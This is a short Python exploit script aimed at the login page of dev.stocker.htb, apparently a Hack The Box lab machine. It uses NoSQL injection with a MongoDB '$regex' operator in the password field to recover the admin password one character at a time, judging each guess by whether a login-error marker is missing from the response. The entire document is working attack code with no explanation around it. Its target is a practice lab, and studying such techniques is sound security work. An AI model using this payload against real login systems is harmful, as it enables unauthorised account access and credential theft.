import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://dev.stocker.htb/login"
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|','&','$']:
            payload='username=%s&password[$regex]=^%s' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            print("trying %s"% c)
            if 'error=login-error' not in r.text:
                print("Found one more char : %s" % (password+c))
                password += c
